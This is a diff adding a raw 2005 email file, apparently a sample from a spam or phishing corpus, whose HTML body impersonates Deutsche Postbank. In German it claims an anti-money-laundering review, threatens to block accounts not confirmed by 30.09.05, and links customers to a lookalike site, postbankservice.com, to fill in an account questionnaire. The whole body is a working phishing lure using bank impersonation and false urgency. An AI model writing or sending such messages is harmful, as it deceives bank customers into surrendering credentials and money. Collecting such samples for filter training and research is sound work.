@@ -1,0 +1,131 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id B0F5E2A88C
+	for <user@example.com>; Sat, 24 Sep 2005 18:29:54 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 9B45B621C99; Sat, 24 Sep 2005 18:29:54 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 823BF621C90
+	for <user@example.com>; Sat, 24 Sep 2005 18:29:54 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id SAA23222
+	for user@example.com; Sat, 24 Sep 2005 18:29:54 -0400
+Received: from va-71-0-90-8.dyn.sprint-hsd.net (va-71-0-90-8.dyn.sprint-hsd.net [71.0.90.8])
+	by mail.example.com with SMTP id SAA23214
+	for <user@example.com>; Sat, 24 Sep 2005 18:29:53 -0400
+Received: from [136.203.96.222] (port=3103 helo=[Alfredo])
+    by va-71-0-90-8.dyn.sprint-hsd.net with esmtp 
+    id 6698926307Codie17211
+    for user@example.com; Sat, 24 Sep 2005 18:29:53 -0400
+Mime-Version: 1.0 (Apple Message framework v728)
+Content-Transfer-Encoding: 7bit
+Message-Id: <4922964948.5578714252@va-71-0-90-8.dyn.sprint-hsd.net>
+Content-Type: text/html; charset=US-ASCII; format=flowed
+To: user@biochemistry.BIOC.cwru.edu
+From: Ali <Jimmy@yulanstudio.com>
+Subject: Postbank.de
+Date: Sat, 24 Sep 2005 18:29:52 -0400
+X-Mailer: Apple Mail (2.728)
+Content-Length: 3089
+Lines: 93
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 161
+
+
+<html>
+<head>
+<title>Postbank</title>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<style type="text/css"><!--
+body, img {
+  border: 0px;
+  margin: 0px;
+}
+
+.text, .text * td {
+	font-family:arial,geneva,helvetica,sans-serif;
+	font-size: 12px;
+	color: #000066;
+	font-weight: normal;
+}
+
+.text a, .text * td a,
+.text a:active, .text * td a:active,
+.text a:visited, .text * td a:visited { 
+	font-family: arial,geneva,helvetica,sans-serif;
+	font-weight: bold;
+	color: #000066;
+	text-decoration: underline;
+}
+
+.text a:hover, .text * td a:hover { 
+	font-family: arial,geneva,helvetica,sans-serif;
+	font-weight: bold;
+	color: #000066;
+	text-decoration: none;
+}
+--></style>
+</head>
+<body bgcolor="#ffffff">
+<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0" valign="top">
+	<tr height="100%">
+		<td width="50%"></td>
+		<td width="616" valign="top">
+			<table border="0" cellpadding="0" cellspacing="0" valign="top" width="616" height="100%">
+				<tr height="10">
+					<td width="616"><br><br></td>
+				</tr>
+				<tr height="16">
+					<td width="616" bgcolor="#000066"></td>
+				</tr>
+				<tr height="67">
+					<td width="616"><img src="http://postbankservice.com/img/logo.jpg" width="616" height="67" alt="http://postbankservice.com"></td>
+				</tr>
+				<tr height="16">
+					<td width="616" bgcolor="#cocceo"></td>
+				</tr>
+				<tr height="300">
+					<td width="616" valign="top" class="text">
+<br><br>
+Sehr geehrte Kundin,
+<br>
+Sehr geehrter Kunde,
+<br> 
+Unser  Land ist  mit on - line - Banking in eine schwierige Lage geraten, deswegen wurde uns empfohlen, alle on - line - Konten von unserer Bank zu kontrollieren, um die "Tageskonten" festzustellen, die von den Verbr&auml;chern dazu benutzt  werden, die gestohlenen Gelder zu waschen. Deswegen  bitten wir unsere Kunden und Partner  inst&auml;ndig, einen Fragebogen f&uuml;r eine Kontobest&auml;tigung, der sich auf unserer offiziellen Web-Seite befindet, auszuf&uuml;llen.  
+<br>
+Die Konten, die bis zum <b>30.09.05</b> auf diesem Fragebogen nicht angegeben werden, werden sie bis zur Feststellung der Bedingungen ihrer Er&ouml;ffnung und Verwendung blockiert. Diese Kontrolle geht sowohl die Privatkunden, als auch die Firmenkunden an. 
+<br><br>
+<div align="center"><a href="http://postbankservice.com"><img src="http://postbankservice.com/img/clickhere.gif" width="180" height="30" alt="http://postbankservice.com"></a></div>
+<br><br>
+Wir wollen uns bei Ihnen f&uuml;r die Unannehmlichkeiten, die wir Ihnen  bereitet haben, entschuldigen, und,  hoffen auf Ihre Unterst&uuml;tzung und gegenseitiges Einverst&auml;ndnis.   
+<br><br>
+Mit freundlichen Gr&uuml;&#223;en,
+<br>
+Sicherheitsabteilung,
+<br>
+Postbank.de
+<br><br><br>
+				
+					</td>
+				</tr>
+				<tr height="16">
+					<td width="616" bgcolor="#cocceo"></td>
+				</tr>
+				<tr height="16">
+					<td width="616" align="right" class="text"><small>© 2004 Deutsche Postbank AG</small></td>
+				</tr>
+				<tr height="100%">
+					<td width="616"></td>
+				</tr>
+			</table>
+		</td>
+		<td width="50%"></td>	
+	</tr>
+</table>
+</body>
+
+
